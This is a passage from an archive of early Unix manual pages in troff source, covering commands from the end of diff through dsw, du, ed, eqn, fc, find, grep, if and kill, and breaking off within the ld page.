Only an ancestral file ($1) and a chain of 
version-to-version
.it ed
scripts ($2,$3,...) made by
.it diff
need be on hand.
A `latest version' appears on
the standard output.
.s3
.lp +5 0
.tr ||
(cat $2 ... $9; echo "1,$p") \*v ed \*- $1
.s3
.i0
Except for occasional `jackpots',
.it diff
finds a smallest sufficient set of file
differences.
.sh "SEE ALSO"
cmp (I), comm (I), ed (I)
.sh DIAGNOSTICS
`jackpot' \*- To speed things up, the program uses hashing.
You have stumbled on a case where there is a chance that
this has resulted in
a difference being called where none actually existed.
Sometimes reversing the order of files will make a
jackpot go away.
.sh BUGS
Editing scripts produced under the
\fB\*-\fR option are naive about
creating lines consisting of a single `\fB.\fR'.
-- /usr/man/man1/dsw.1 mode=0100664 uid=3 gid=3 atime=170022128 mtime=173061342 --
.th DSW I 3/15/72
.sh NAME
dsw  \*-  delete interactively
.sh SYNOPSIS
.bd dsw
[ directory ]
.sh DESCRIPTION
For
each file in the given directory
(`\fB.\fR'
if not specified)
.it dsw
types its name.
If
.bd y
is typed, the file is deleted;
if
.bd x,
.it dsw
exits;
if new-line, the file is not deleted;
if anything else,
.it dsw
asks again.
.sh "SEE ALSO"
rm (I)
.sh BUGS
The name
.it dsw
is a carryover from the ancient past.  Its etymology is
amusing.
-- /usr/man/man1/du.1 mode=0100664 uid=3 gid=3 atime=170022128 mtime=173061342 --
.th DU I 1/20/73
.sh NAME
du  \*-  summarize disk usage
.sh SYNOPSIS
.bd du
[
.bd \*-s
] [
.bd \*-a
] [ name ... ]
.sh DESCRIPTION
.it Du
gives the number of blocks contained in all files
and (recursively) directories within each specified directory or
file
.it name.
If
.it name
is missing,
`\fB.\fR'
is used.
.s3
The optional argument
.bd \*-s
causes only the grand total to
be given.
The optional argument
.bd \*-a
causes an entry to be generated
for each file.
Absence of either causes an entry to be generated for
each directory only.
.s3
A file which has two links to it is only counted once.
.sh BUGS
Non-directories
given as arguments (not under
.bd \*-a
option) are not listed.
.s3
Removable
file systems do not work correctly
since i-numbers may be repeated while the corresponding
files are distinct.
.it Du
should maintain an i-number list per root directory
encountered.
-- /usr/man/man1/echo.1 mode=0100664 uid=3 gid=3 atime=170022129 mtime=173061342 --
.th ECHO I 3/15/72
.sh NAME
echo \*- echo arguments 
.sh SYNOPSIS
.bd echo
[ arg ... ]
.sh DESCRIPTION
.it Echo
writes its arguments in order as a line on the
standard output file.
It is mainly useful for producing diagnostics in command files.
.sh BUGS
-- /usr/man/man1/ed.1 mode=0110664 uid=3 gid=3 atime=170022131 mtime=173061342 --
.th ED I 1/15/73
.if t .ds q \(aa
.if n .ds q '
.sh NAME
ed \*- text editor
.sh SYNOPSIS
.bd ed
[
.bd \*-
] [ name ]
.sh DESCRIPTION
.it Ed
is the standard text editor.
.s3
If a
.it name
argument is given,
.it ed
simulates an
.it e
command (see below)\| on the named file; that is to say,
the file is read into
.it ed's
buffer so that it can be edited.
The optional
.bd \*-
suppresses the printing
of character counts by
.it e,
.it r,
and
.it w
commands.
.s3
.it Ed
operates on a copy of any file it is editing; changes made
in the copy have no effect on the file until a \fIw\fR (write)\|
command is given.
The copy of the text being edited resides
in a temporary file called the 
.it buffer.
There is only
one buffer.
.s3
Commands to
.it ed
have a simple and regular structure: zero or
more
.it addresses
followed by a single character
.it command,
possibly
followed by parameters to the command.
These addresses specify one or more lines in the buffer.
Every command which requires addresses has default addresses,
so that the addresses can often be omitted.
.s3
In general, only one command may appear on a line.
Certain commands allow the input of text.
This text is placed in the appropriate place in the buffer.
While
.it ed
is accepting text, it is said
to be in
\fIinput mode.\fR
In this mode, no commands are recognized;
all input is merely collected.
Input mode is left by typing a period `\fB.\fR' alone at the
beginning of a line.
.s3
.it Ed
supports a limited form of
.it "regular expression"
notation.
A regular expression specifies
a set of strings of characters.
A member of this set of strings is said to be
.it matched
by the regular expression.
The regular expressions allowed by
.it ed
are constructed as follows:
.s3
.lp +3 3
1.	An ordinary character (not one of those discussed below)\|
is a regular expression and matches that character.
.s3
.lp +3 3
2.	A circumflex `^' at the beginning of a regular expression
matches the empty string at the beginning of a line.
.s3
.lp +3 3
3.	A currency symbol `$' at the end of a regular expression
matches the null character at the end of a line.
.s3
.lp +3 3
4.	A period `\fB.\fR' matches any character except a new-line character.
.s3
.lp +3 3
5.	A regular expression followed by an asterisk `*'
matches any number of adjacent occurrences (including zero)\|
of the regular expression it follows.
.s3
.lp +3 3
6.	A string of characters enclosed in square brackets
`[ ]' matches any character in the string but no others.
If, however, the first character of the string is a circumflex
`^' the regular expression matches any character except new-line
and the characters in the string.
.s3
.lp +3 3
7.	The concatenation of regular expressions is a regular
expression which matches the concatenation of the strings
matched by the components of the regular expression.
.s3
.lp +3 3
8.	A regular expression enclosed between
the sequences
`\\(' and `\\)'is identical to the
unadorned expression; the construction has side effects discussed
under the
.it s
command.
.s3
.lp +3 3
9.	The null regular expression standing alone
is equivalent to the last regular expression encountered.
.s3
.i0
Regular expressions are used in addresses to specify
lines and in one command
(see
.it s
below)\|
to specify a portion of a line which is to be replaced.
If it is desired to use one of
the regular expression metacharacters as an ordinary
character, that character may be preceded by `\\'.
This also applies to the character bounding the regular
expression (often `/')\| and to `\\' itself.
.s3
To understand addressing in
.it ed
it is necessary to know that at any time there is a
\fIcurrent line.\fR
Generally speaking, the current line is
the last line affected by a command; however,
the exact effect on the current line
is discussed under the description of
the command.
Addresses are constructed as follows.
.s3
.lp +6 3
1.	The character `\fB.\fR' addresses the current line.
.s3
.lp +6 3
2.	The character `$' addresses the last line of the buffer.
.s3
.lp +6 3
3.	A decimal number
.it n
addresses the
\fIn\fR-th
line of the buffer.
.s3
.lp +6 3
4.	`\*q\fIx\fR' addresses the line marked with the
mark name character \fIx\fR,
which must be a lower-case letter.
Lines are marked with the
.it k
command described below.
.s3
.lp +6 3
5.	A regular expression enclosed in slashes `/' addresses
the first line found by searching toward the end of the
buffer and stopping at the first line containing a
string matching the regular expression.
If necessary the search wraps around to the beginning of the
buffer.
.s3
.lp +6 3
6.	A regular expression enclosed in queries `?' addresses
the first line found by searching toward the beginning of
the buffer and stopping at the first line containing
a string matching the regular expression.
If necessary
the search wraps around to the end of the buffer.
.s3
.lp +6 3
7.	An address followed by a plus sign `+'
or a minus sign `\*-' followed by a decimal number specifies that address plus
(resp. minus)\| the indicated number of lines.
The plus sign may be omitted.
.s3
.lp +6 3
8.	If an address begins with `+' or `\-'
the addition or subtraction is taken with respect to the current line;
e.g. `\-5' is understood to mean `\fB.\fR\-5'.
.s3
.lp +6 3
9.	If an address ends with `+' or `\-',
then 1 is added (resp. subtracted).
As a consequence of this rule and rule 8,
the address `\-' refers to the line before the current line.
Moreover,
trailing
`+' and `\-' characters
have cumulative effect, so `\-\-' refers to the current
line less 2.
.s3
.lp +6 3
10.	To maintain compatibility with earlier version of the editor,
the character `^' in addresses is entirely
equivalent to `\-'.
.s3
.i0
Commands may require zero, one, or two addresses.
Commands which require no addresses regard the presence
of an address as an error.
Commands which accept one or two addresses
assume default addresses when insufficient are given.
If more addresses are given than such a command requires,
the last one or two (depending on what is accepted)\| are used.
.s3
Addresses are separated from each other typically by a comma
`\fB,\fR'.
They may also be separated by a semicolon
`\fB;\fR'.
In this case the current line `\fB.\fR' is set to
the previous address before the next address is interpreted.
This feature can be used to determine the starting
line for forward and backward searches (`/', `?')\|.
The second address of any two-address sequence
must correspond to a line following the line corresponding to the first address.
.s3
In the following list of
.it ed
commands, the default addresses
are shown in parentheses.
The parentheses are not part of
the address, but are used to show that the given addresses are
the default.
.s3
As mentioned, it is generally illegal for more than one
command to appear on a line.
However, any command may be suffixed by `p'
or by `l', in which case
the current line is either
printed or listed respectively
in the way discussed below.
.s3
.lp +5 5
( \fB. \fR)\|a
.lp +5 5
<text>
.lp +5 5
.li
\fB.\fR
.lp +5 5
	The append command reads the given text
and appends it after the addressed line.
`\fB.\fR' is left
on the last line input, if there
were any, otherwise at the addressed line.
Address `0' is legal for this command; text is placed
at the beginning of the buffer.
.s3
.lp +5 5
( \fB. \fR, \fB. \fR)\|c
.lp +5 5
<text>
.lp +5 5
.li
\fB.\fR
.lp +5 5
	The change
command deletes the addressed lines, then accepts input
text which replaces these lines.
`\fB.\fR' is left at the last line input; if there were none,
it is left at the first line not deleted.
.s3
.lp +5 5
( \fB. \fR, \fB. \fR)\| d
.br
The delete command deletes the addressed lines from the buffer.
The line originally after the last line deleted becomes the current line;
if the lines deleted were originally at the end,
the new last line becomes the current line.
.s3
.lp +5 5
e filename
.br
The edit
command causes the entire contents of the buffer to be deleted,
and then the named file to be read in.
`\fB.\fR' is set to the last line of the buffer.
The number of characters read is typed.
`filename' is remembered for possible use as a default file name
in a subsequent
.it r
or
.it w
command.
.s3
.lp +5 5
f filename
.br
The filename command prints the currently remembered file name.
If `filename' is given,
the currently remembered file name is changed to `filename'.
.s3
.lp +5 5
(1,$)\|g/regular expression/command list
.br
In the global
command, the first step is to mark every line which matches
the given regular expression.
Then for every such line, the
given command list is executed with `\fB.\fR' initially set to that line.
A single command or the first of multiple commands
appears on the same line with the global command.
All lines of a multi-line list except the last line must be ended with `\\'.
.it A,
.it i,
and
.it c
commands and associated input are permitted;
the `\fB.\fR' terminating input mode may be omitted if it would be on the
last line of the command list.
The (global)\| commands,
.it g,
and
.it v,
are not permitted in the command list.
.s3
.lp +5 5
( \fB. \fR)\|i
.lp +5 5
<text>
.lp +5 5
.li
\fB.\fR
.br
This command inserts the given text before the addressed line.
`\fB.\fR' is left at the last line input; if there were none,
at the addressed line.
This command differs from the
.it a
command only in the placement of the
text.
.s3
.lp +5 5
( \fB. \fR)\|k\fIx\fR
.br
The mark command marks the addressed line with
name
.it x,
which must be a lower-case letter.
The address form `\*q\fIx\fR' then addresses this line.
.s3
.lp +5 5
( \fB. \fR, \fB. \fR)\|l
.br
The list command
prints the addressed lines in an unambiguous way:
non-graphic characters are
printed in octal,
and long lines are folded.
An
.it l
command may follow any other on the same line.
.s3
.lp +5 5
( \fB. \fR, \fB. \fR)\|m\fIa\fR
.br
The move command repositions the addressed lines after the line
addressed by
.it a.
The last of the moved lines becomes the current line.
.s3
.lp +5 5
( \fB. \fR, \fB. \fR)\|p
.br
The print command prints the addressed lines.
`\fB.\fR'
is left at the last line printed.
The
.it p
command
may
be placed on the same line after any command.
.s3
.lp +5 5
q
.br
The quit command causes
.it ed
to exit.
No automatic write
of a file is done.
.s3
.lp +5 5
($)\|r filename
.br
The read command
reads in the given file after the addressed line.
If no file name is given,
the remembered file name, if any, is used
(see
.it e
and
.it f
commands)\|.
The remembered file name is not changed unless
`filename' is the very first file name
mentioned.
Address `0' is legal for
.it r
and causes the
file to be read at the beginning of the buffer.
If the read is successful, the number of characters
read is typed.
`\fB.\fR' is left at the last line read in from the file.
.s3
.lp +5 5
( \fB. \fR, \fB. \fR)\|s/regular expression/replacement/         or,
.lp +5 5
( \fB. \fR, \fB. \fR)\|s/regular expression/replacement/g
.br
The substitute command searches each addressed
line for an occurrence of the specified regular expression.
On each line in which a match is found,
all matched strings are replaced by the replacement specified,
if the global replacement indicator `g' appears after the command.
If the global indicator does not appear, only the first occurrence
of the matched string is replaced.
It is an error for the substitution to fail on all addressed lines.
Any character other than space or new-line
may be used instead of `/' to delimit the regular expression
and the replacement.
`\fB.\fR' is left at the last line substituted.
.s2
An ampersand `&' appearing in the replacement
is replaced by the string matching the regular expression.
The special meaning of `&' in this context may be
suppressed by preceding it by `\\'.
As a more general feature,
the characters
`\\\fIn\fR',
where
.it n
is a digit,
are replaced by the text matched by the
\fIn\fR-th
regular subexpression
enclosed between `\\(' and `\\)'.
When
nested, parenthesized subexpressions
are present,
.it n
is determined by counting occurrences of `\\(' starting from the left.
.s2
Lines may be split by substituting new-line characters into them.
The new-line in the
replacement string
must be escaped by preceding it by `\\'.
.s3
.lp +5 5
( \fB.\fR , \fB.\fR ) t \fIa\fR
.br
This command acts just like the
.it m
command, except that a copy of the addressed lines is placed
after address
.it a
(which may be 0).
`\fB.\fR' is left on the last line of the copy.
.s3
.lp +5 5
(1,$)\|v/regular expression/command list
.br
This command is the same as the global command
except that the command list is executed
with `\fB.\fR' initially set to every line
.it except
those
matching the regular expression.
.s3
.lp +5 5
(1,$)\|w filename
.br
The write command writes the addressed lines onto
the given file.
If the file does not exist,
it is created mode 666 (readable and writeable by everyone)\|.
The remembered file name is
.it not
changed unless
`filename' is the very first file name mentioned.
If no file name is given,
the remembered file name, if any, is used
(see
.it e
and
.it f
commands)\|.
`\fB.\fR' is unchanged.
If the command is successful, the number of characters written is
typed.
.s3
.lp +5 5
($)\|=
.br
The line number of the addressed line is typed.
`\fB.\fR' is unchanged by this command.
.s3
.lp +5 5
!UNIX command
.br
The remainder of the line after the `!' is sent
to UNIX to be interpreted as a command.
`\fB.\fR' is unchanged.
.s3
.lp +5 5
( \fB.\fR+1 )\|<newline>
.br
An address alone on a line causes the addressed line to be printed.
A blank line alone is equivalent to `.+1p'; it is useful
for stepping through text.
.s3
.i0
If an interrupt signal (ASCII DEL)\| is sent,
.it ed
prints a `?' and returns to its command level.
.s3
Some size limitations:
512 characters per line,
256 characters per global command list,
64 characters per file name,
and 128K characters in the temporary file.
The limit on the number of lines depends on the amount of core:
each line takes 1 word.
.sh FILES
/tmp/#, temporary;
`#' is the process number (in octal).
.sh DIAGNOSTICS
`?' for
errors in commands;
`TMP' for temporary file overflow.
.sh "SEE ALSO"
A Tutorial Introduction to the ED Text Editor
(B. W. Kernighan)
.sh BUGS
The
.it s
command causes all marks
to be lost on lines changed.
-- /usr/man/man1/eqn.1 mode=0100664 uid=3 gid=3 atime=170022132 mtime=173061342 --
.EQ
delim $$
.EN
.th EQN I 2/22/74
.sh NAME
eqn  \*-  typeset mathematics
.sh SYNOPSIS
.bd eqn
[ file ] ...
.sh DESCRIPTION
.it Eqn
is a
troff (I)
preprocessor
for typesetting mathematics
on the Graphics Systems phototypesetter.
Usage is almost always
.s3
	eqn file ... | troff
.s3
If no files are specified, 
.it eqn
reads from the standard input.
A line beginning with ``.EQ'' marks the start of an equation;
the end of an equation
is marked by a line beginning with ``.EN''.
Neither of these lines is altered or defined by
.it eqn,
so you can define them yourself to get
centering, numbering, etc.
All other lines are treated as comments, and passed through
untouched.
.s3
Spaces, tabs, newlines, braces, double quotes,
tilde and circumflex are the only delimiters.
Braces ``{}'' are used for grouping.
Use tildes ``~'' to get extra spaces in an equation.
.s3
.vs 13p
Subscripts and superscripts are produced with the keywords
.bd sub
and
.bd sup.
Thus
.it "x sub i" 
makes
$x sub i$, 
.it "a sub i sup 2"
produces
$a sub i sup 2$,
and
.it "e sup {x sup 2 + y sup 2}"
gives
$e sup {x sup 2 + y sup 2}$.
Fractions are made with
.bd over.
.it "a over b"
is $a over b$ and
.it "1 over sqrt {ax sup 2 +bx+c}"
is
$1 over sqrt {ax sup 2 +bx+c}$ .
.bd sqrt
makes square roots.
.s3
The keywords
.bd from
and
.bd to
introduce lower and upper
limits on arbitrary things:
$lim from {n-> inf} sum from 0 to n x sub i$
is made with
.it "lim from {n-> inf} sum from 0 to n x sub i."
Left and right brackets, braces, etc., of the right height are made with
.bd left
and
.bd right:
.it "left [ x sup 2 + y sup 2 over alpha right ] ~=~1"
produces
$left [ x sup 2 + y sup 2 over alpha right ] ~=~1$.
The
.bd right
clause is optional.
.s3
Vertical piles of things are made with 
.bd "pile, lpile, cpile,"
and
.bd rpile:
.it "pile {a above b above c}"
produces
$pile {a above b above c}$.
There can be an arbitrary number of elements in a pile.
.bd lpile
left-justifies,
.bd pile
and
.bd cpile
center, with different vertical spacing,
and 
.bd rpile
right justifies.
.s3
.vs 12p
Diacritical marks are made with
.bd dot,
.bd dotdot,
.bd hat,
.bd bar:
.it "x dot = f(t) bar"
is
$x dot = f(t) bar$.
Default sizes and fonts can be changed with
.bd "size n"
and various of
.bd roman,
.bd italic,
and
.bd bold.
.s3
Keywords like 
.it sum
.EQ
( sum )
.EN
.it int
.EQ
( int )
.EN
.it inf
.EQ
( inf )
.EN
and shorthands like
>=
.EQ
(>=)
.EN
\*->
.EQ
(->),
.EN
!=
.EQ
( != ),
.EN
are recognized.
Spell out Greek letters in the desired case, as in
.it "alpha, GAMMA."
Mathematical words like sin, cos, log are made Roman automatically.
Troff (I)
four-character escapes like \\(bs (\(bs)
can be used anywhere.
Strings enclosed in double quotes "..."
are passed through untouched.
.sh "SEE ALSO"
A System for Typesetting Mathematics
(Computer Science Technical Report #17, Bell Laboratories, 1974.)
.br
TROFF Users' Manual (internal memorandum)
.br
TROFF Made Trivial (internal memorandum)
.br
troff (I), neqn (I)
.sh BUGS
Undoubtedly.
Watch out for small or large point sizes \*-
it's tuned too well for size 10.
Be cautious if inserting horizontal or vertical motions,
and of backslashes in general.
-- /usr/man/man1/exit.1 mode=0100664 uid=3 gid=3 atime=170022133 mtime=173061342 --
.th EXIT I 3/15/72
.sh NAME
exit  \*-  terminate command file
.sh SYNOPSIS
.bd exit
.sh DESCRIPTION
.it Exit
performs a
.bd seek
to the end of its standard input file.
Thus, if it is invoked inside
a file of commands, upon return from
.it exit
the shell will
discover an end-of-file and terminate.
.sh "SEE ALSO"
if (I), goto (I), sh (I)
.sh BUGS
-- /usr/man/man1/fc.1 mode=0110664 uid=3 gid=3 atime=170022134 mtime=173061342 --
.th FC I 8/20/73
.sh NAME
fc \*- Fortran compiler
.sh SYNOPSIS
.bd fc
[
.bd \*-c
] sfile1.f ... ofile1 ...
.sh DESCRIPTION
.it Fc
is the UNIX Fortran compiler.
It accepts three types of arguments:
.s3
Arguments whose names end with `.f' are assumed to be
Fortran source program units; they are compiled, and
the object program is left on the file sfile1.o (i.e.
the file whose name is that of the source with `.o' substituted
for `.f').
.s3
Other arguments (except for
\fB\*-c\fR)
are assumed
to be either loader flags, or
object programs, typically produced by an earlier
.it fc
run,
or perhaps libraries of Fortran-compatible routines.
These programs, together with the results of any
compilations specified, are loaded (in the order
given) to produce an executable program with name
.bd a.out.
.s3
The
.bd \*-c
argument suppresses the loading phase, as does
any syntax error in any of the routines being compiled.
.s3
The following is a list
of differences between
.it fc
and ANSI standard Fortran (also see the BUGS section):
.s3
.lp +4 4
1.	Arbitrary combination of types is allowed
in expressions.  Not all combinations are expected to
be supported at runtime.
All of the normal
conversions involving integer, real, double
precision and complex are allowed.
.s3
.lp +4 4
2.	Two forms of ``implicit'' statements are recognized:
.bd "implicit integer /i\*-n/",
or
.bd "implicit integer (i\-n)."
.s3
.lp +4 4
3.	The types
doublecomplex, logical*1,
integer*1, integer*2,
integer*4 (same as integer),
real*4 (real),
and real*8 (double precision)
are supported.
.s3
.lp +4 4
4.	\fB&\fR as the first character of a line
signals a continuation card.
.s3
.lp +4 4
5.	\fBc\fR as the first character of a line signals a comment.
.s3
.lp +4 4
6.	All keywords are recognized in lower case.
.s3
.lp +4 4
7.	The notion of `column 7' is not implemented.
.s3
.lp +4 4
8.	G-format input is free form\*-
leading blanks are ignored, the first blank after the start
of the number terminates the field.
.s3
.lp +4 4
9.	A comma in any numeric or logical input field terminates
the field.
.s3
.lp +4 4
10.	There is no carriage control on output.
.s3
.lp +4 4
11.	A sequence of
.it n
characters in double quotes `"' is equivalent to
.it n
.bd h
followed by those characters.
.s3
.lp +4 4
12.	In
.bd data
statements, a hollerith string may initialize an array
or a sequence of array elements.
.s3
.lp +4 4
13.	The number of storage units requested by a binary
.bd read
must be identical to the number contained
in the record being read.
.s3
.lp +4 4
14.	If the first character in an input file is ``#'',
a preprocessor identical to the C preprocessor
is called, which implements ``#define'' and ``#include''
preprocessor statements.
(See the C reference manual for details.)
The preprocessor does not recognize
Hollerith strings written with
\fIn\*|\fBh\fR.
.s3
.i0
In I/O statements, only unit numbers 0-19 are supported.
Unit number
.it n
refers to file
fort\fInn;\fR
(e.g. unit 9 is file `fort09').
For input, the file must exist;
for output, it will be created.
Unit 5 is permanently associated with
the standard input file; unit 6 with the
standard output file.
Also see
.it setfil
(III)
for a way to associate unit numbers with named files.
.sh FILES
.ta 1.5i
.nf
a.out	loaded output
f.tmp[123]	temporary (deleted)
/usr/fort/fc1	compiler proper
/lib/fr0.o	runtime startoff
/lib/filib.a	interpreter library
/lib/libf.a	builtin functions, etc.
/lib/liba.a	system library
.fi
.sh "SEE ALSO"
rc (I), which announces a more pleasant Fortran dialect;
the ANSI standard;
ld (I) for loader flags.
For some subroutines, try
ierror, getarg, setfil (III).
.sh DIAGNOSTICS
Compile-time diagnostics are given in English,
accompanied if possible with the offending
line number and source line with an underscore where the error
occurred.
Runtime diagnostics
are given by number as follows:
.s3
.lp +5 5
1	invalid log argument
.lp +5 5
2	bad arg count to amod
.lp +5 5
3	bad arg count to atan2
.lp +5 5
4	excessive argument to cabs
.lp +5 5
5	exp too large in cexp
.lp +5 5
6	bad arg count to cmplx
.lp +5 5
7	bad arg count to dim
.lp +5 5
8	excessive argument to exp
.lp +5 5
9	bad arg count to idim
.lp +5 5
10	bad arg count to isign
.lp +5 5
11	bad arg count to mod
.lp +5 5
12	bad arg count to sign
.lp +5 5
13	illegal argument to sqrt
.lp +5 5
14	assigned/computed goto out of range
.lp +5 5
15	subscript out of range
.lp +5 5
16	real**real overflow
.lp +5 5
17	(negative real)**real
.lp +5 5
100	illegal I/O unit number
.lp +5 5
101	inconsistent use of I/O unit
.lp +5 5
102	cannot create output file
.lp +5 5
103	cannot open input file
.lp +5 5
104	EOF on input file
.lp +5 5
105	illegal character in format
.lp +5 5
106	format does not begin with (
.lp +5 5
107	no conversion in format but non-empty list
.lp +5 5
108	excessive parenthesis depth in format
.lp +5 5
109	illegal format specification
.lp +5 5
110	illegal character in input field
.lp +5 5
111	end of format in hollerith specification
.lp +5 5
112	bad argument to setfil
.lp +5 5
120	bad argument to ierror
.lp +5 5
999	unimplemented input conversion
.i0
.sh BUGS
The following is a list of
those features not yet implemented:
.br
arithmetic statement functions
.br
scale factors on input
.br
.bd Backspace
statement.
-- /usr/man/man1/file.1 mode=0100664 uid=3 gid=3 atime=170022135 mtime=173061342 --
.th FILE I 1/16/75
.sh NAME
file \*- determine file type
.sh SYNOPSIS
.bd file
file ...
.sh DESCRIPTION
.it File
performs a series of tests on each argument
in an attempt to classify it.
If an argument appears to be ascii,
.it file
examines the first 512 bytes
and tries to guess its language.
.sh BUGS
-- /usr/man/man1/find.1 mode=0100664 uid=3 gid=3 atime=170022135 mtime=173061342 --
.th FIND I 5/15/74
.sh NAME
find \*- find files
.sh SYNOPSIS
.bd find
pathname expression
.sh DESCRIPTION
.it Find
recursively descends
the directory hierarchy from
.it pathname
seeking files that match a boolean
.it expression
written in the primaries given below.
In the descriptions, the argument
.it n
is used as a decimal integer
where
.it +n
means more than
.it n,
.it \*-n
means less than
.it n
and
.it n
means exactly
.it n.
.s3
.lp +16 16
\fB\*-name\fR filename	True if the
.it filename
argument matches the current file name.
Normal
.it Shell
argument syntax may be used if escaped (watch out for
`[', `?' and `*').
.s3
.lp +16 16
\fB\*-perm\fR onum	\c
True if the file permission flags
exactly
match the
octal number
.it onum
(see chmod(I)).
If
.it onum
is prefixed by a minus sign,
more flag bits (017777, see stat(II)) become significant and
the flags are compared: 
.it "(flags&onum)==onum."
.s3
.lp +16 16
\fB\*-type\fI c\fR	True if the type of the file
is
.it c,
where
.it c
is
.bd "b, c, d"
or
.bd f
for
block special file, character special file,
directory or plain file.
.s3
.lp +16 16
\fB\*-links\fI n\fR	\c
True if the file has
.it n
links.
.s3
.lp +16 16
\fB\*-user\fR uname	\c
True if the file belongs to the user
.it uname.
.s3
.lp +16 16
\fB\*-group\fR gname	\c
As it is for
.bd \*-user
so shall it be for
.bd \*-group
(someday).
.s3
.lp +16 16
\fB\*-size\fI n\fR	\c
True if the file is
.it n
blocks long (512 bytes per block).
.s3
.lp +16 16
\fB\*-atime\fI n\fR	\c
True if the file has been accessed in
.it n
days.
.s3
.lp +16 16
\fB\*-mtime\fI n\fR	\c
True if the file has been modified in
.it n
days.
.s3
.lp +16 16
\fB\*-exec\fR command	\c
True if the executed command returns
exit status zero
(most commands do).
The end of the command is punctuated by an escaped
semicolon.
A command argument `{}' is replaced by the
current pathname.
.s3
.lp +16 16
\fB\*-ok\fR command	\c
Like
.bd \*-exec
except that the generated command line is printed
with a question mark first,
and is executed only if the user responds
\fBy\fR.
.s3
.lp +16 16
\fB\*-print\fR	\c
Always true;
causes the current pathname to be printed.
.s3
.i0
The primaries may be combined with 
these operators
(ordered by precedence):
.s3
.lp +16 16
\fB!\fR	prefix 
.it not
.s3
.lp +16 16
\fB\*-a\fR	infix
.it and,
second operand evaluated only if first is true
.s3
.lp +16 16
\fB\*-o\fR	infix
.it or,
second operand evaluated only if first is false
.s3
.lp +16 16
\fB( \fRexpression\fB )\fR	parentheses for grouping.
(Must be escaped.)
.s3
.i0
To remove files named
`a.out' and `*.o' not accessed for a week:
.s3
.lp +.5i 0
find / "(" \*-name a.out \*-o \*-name "*.o" ")"
\*-a \*-atime +7 \*-a \*-exec rm {} ";"
.i0
.sh FILES
/etc/passwd
.sh "SEE ALSO"
sh (I), if(I), file system (V)
.sh BUGS
There is no way to check device type.
.br
Syntax should be reconciled with
.it if.
-- /usr/man/man1/goto.1 mode=0100664 uid=3 gid=3 atime=170022136 mtime=173061342 --
.th GOTO I 3/15/72
.sh NAME
goto  \*-  command transfer
.sh SYNOPSIS
.bd goto
label
.sh DESCRIPTION
.it Goto
is allowed only when the Shell
is taking commands from a file.
The file is searched from the beginning
for a line beginning with `:' followed by one
or more spaces followed by
the
.it label.
If such a line is found, the
.it goto
command returns.
Since the read pointer in the command file points to the
line after the label,
the effect is to cause the Shell to transfer to the
labelled line.
.s3
`:' is a do-nothing
command that is ignored by the Shell and only serves to place a label.
.sh "SEE ALSO"
sh (I)
.sh BUGS
-- /usr/man/man1/grep.1 mode=0100664 uid=3 gid=3 atime=170022138 mtime=173061342 --
.th GREP I 5/15/74
.sh NAME
grep \*- search a file for a pattern
.sh SYNOPSIS
.bd grep
[
.bd \*-v
] [
.bd \*-b
] [
.bd \*-c
] [
.bd \*-n
] expression [ file ] ...
.sh DESCRIPTION
.it Grep
searches the input files
(standard input default)
for lines matching the
regular expression.
Normally, each line found
is copied to the standard output.
If the
.bd \*-v
flag is used,
all lines but those matching
are printed.
If the
.bd \*-c
flag is used,
only a count of matching lines is printed.
If the
.bd \*-n
flag is used,
each line is preceded
its relative line number in the file.
If the
.bd \*-b
flag is used,
each line is preceded by the block number
on which it was found.
This is sometimes useful in locating
disk block numbers by context.
.s3
In all cases the file name is shown if there is more than one input file.
.s3
For a complete description
of the regular expression,
see ed (I).
Care should be taken when
using the characters
$ * [ ^ | ( ) and \\ in the regular
expression as they are
also meaningful to the Shell.
It is generally necessary to enclose the
entire
.it expression
argument in quotes.
.sh "SEE ALSO"
ed (I), sh (I)
.sh BUGS
Lines
are limited to 256 characters;
longer lines are truncated.
-- /usr/man/man1/if.1 mode=0100664 uid=3 gid=3 atime=170022139 mtime=173061342 --
.th IF I 5/2/74
.sh NAME
if \*-  conditional command
.sh SYNOPSIS
.bd if
expr command [ arg ... ]
.sh DESCRIPTION
.it If
evaluates the expression
.it expr,
and if its value is
true,
executes the given
.it command
with the given arguments.
.s3
The following primitives are used to construct
the
.it expr:
.s3
.lp +13 13
\fB\*-r\fR file	true if the file exists and is readable.
.s3
.lp +13 13
\fB\*-w \fRfile	true if the file exists and is writable.
.s3
.lp +13 13
s1 \fB= \fRs2	true
if the strings
.it s1
and
.it s2
are equal.
.s3
.lp +13 13
s1 \fB!= \fRs2	true
if the strings
.it s1
and
.it s2
are not equal.
.s3
.lp +13 13
\fB{ \fRcommand \fB}\fR	The bracketed command is
executed to obtain the
exit status.
Status zero is considered
.it true.
The command must
not
be another
.it if.
.s3
.i0
These primaries may be combined with the
following operators:
.s3
.lp +13 13
\fB!\fR	unary negation operator
.s3
.lp +13 13
\fB\*-a\fR	binary
.it and
operator
.s3
.lp +13 13
\fB\*-o\fR	binary
.it or
operator
.s3
.lp +13 13
\fB( \fRexpr\fB )\fR	parentheses for grouping.
.s3
.i0
.bd \*-a
has higher precedence than
.bd \*-o.
Notice that all the operators and flags are separate
arguments to
.it if
and hence must be surrounded by spaces.
Notice also that parentheses are meaningful
to the Shell and must be escaped.
.sh "SEE ALSO"
sh (I), find (I)
.sh BUGS
-- /usr/man/man1/kill.1 mode=0100664 uid=3 gid=3 atime=170022140 mtime=173061342 --
.th KILL I 2/8/75
.sh NAME
kill \*- terminate a process
.sh SYNOPSIS
.bd kill
[ \fB\*-\fRsigno ]
processid ...
.sh DESCRIPTION
Kills the specified processes.
The process number of each asynchronous process
started with `&' is reported by the Shell.
Process numbers can also be found by using \fIps\fR (I).
.s3
If process number 0 is used, then all processes
belonging to the current user and associated with the same control typewriter
are killed.
.s3
The killed process must belong
to the current user unless
he is the super-user.
.s3
If a signal number preceded by ``\*-'' is given
as first argument, that signal is sent instead of
.it kill
(see
.it "signal (II))."
.sh "SEE ALSO"
ps (I), sh (I), signal (II)
.sh BUGS
-- /usr/man/man1/ld.1 mode=0100664 uid=3 gid=3 atime=170022140 mtime=173061342 --
.th LD I 8/16/73
.sh NAME
ld  \*-  link editor
.sh SYNOPSIS
.bd ld
[
.bd \*-sulxrdni
] name ...
.sh DESCRIPTION
.it Ld
combines several
object programs into one; resolves external
references; and searches libraries.
In the simplest case the names of several object
programs are given, and
.it ld
combines them, producing
an object module which can be either executed or
become the input for a further
.it ld
run.
(In the latter case, the
.bd \*-r
option must be given
to preserve the relocation bits.)
The output of
.it ld
is left on
.bd a.out.
This file is made executable
only if no errors occurred during the load.
.s3
The argument routines are concatenated in the order
specified.  The entry point of the output is the
beginning of the first routine.
.s3
If any argument is a library, it is searched exactly once
at the point it is encountered in the argument list.
Only those routines defining an unresolved external
